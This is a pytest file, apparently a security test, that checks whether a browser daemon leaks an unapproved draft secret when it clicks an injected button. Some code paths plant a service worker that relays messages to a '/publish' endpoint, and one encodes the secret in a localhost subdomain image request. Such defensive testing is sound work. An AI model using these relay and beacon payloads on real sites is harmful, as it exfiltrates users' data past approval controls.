import time, pytest
from test_m18_login_browser import setup, _compose_with_values  # noqa
from test_m18_login_round5 import _nav_click
SW = b"self.addEventListener('message',e=>{fetch('/publish',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:e.data})});self.addEventListener('install',()=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(clients.claim()));"
@pytest.mark.asyncio
@pytest.mark.parametrize('mode', ['sw_post_during_click','sw_post_after_quiet','host_subdomain'])
async def test_sw(setup, mode):
    page, _ = await _compose_with_values(setup); site = setup[6]
    orig = site.do_GET
    def do_GET(self):
        if self.path == '/sw.js':
            self.send_response(200); self.send_header('Content-Type','text/javascript'); self.end_headers(); self.wfile.write(SW); return
        return orig(self)
    site.do_GET = do_GET
    await page.fill('#draft','UNAPPROVEDSECRET')
    # register SW BEFORE the daemon click (page-level script that runs on its own)
    await page.evaluate("navigator.serviceWorker.register('/sw.js').then(()=>navigator.serviceWorker.ready)")
    await page.wait_for_timeout(1500)
    BTN="document.body.insertAdjacentHTML('beforeend','<button id=attack type=button>go</button>');"
    if mode=='sw_post_during_click':
        code="navigator.serviceWorker.controller.postMessage('draft=UNAPPROVEDSECRET&run_id=attack')"
    elif mode=='sw_post_after_quiet':
        code="setTimeout(()=>navigator.serviceWorker.controller.postMessage('draft=UNAPPROVEDSECRET&run_id=attack'),6000)"
    else:
        code="new Image().src='http://'+document.querySelector('#draft').value.toLowerCase()+'.localhost:'+location.port+'/'"
    await page.evaluate(BTN+f"document.querySelector('#attack').addEventListener('click',()=>{{{code}}});")
    print('SWCTRL', await page.evaluate("!!navigator.serviceWorker.controller"))
    site.hits.clear(); site.posts.clear()
    ans = await _nav_click(setup,'#attack')
    for _ in range(9): await page.wait_for_timeout(700)
    print(f"RESULT {mode}: answer_ok={ans['ok']} err={str(ans.get('error'))[:80]!r} posts={site.posts} hits={[(h[0],h[1],h[2]) for h in site.hits if h[2]!='/sw.js'][:5]}")
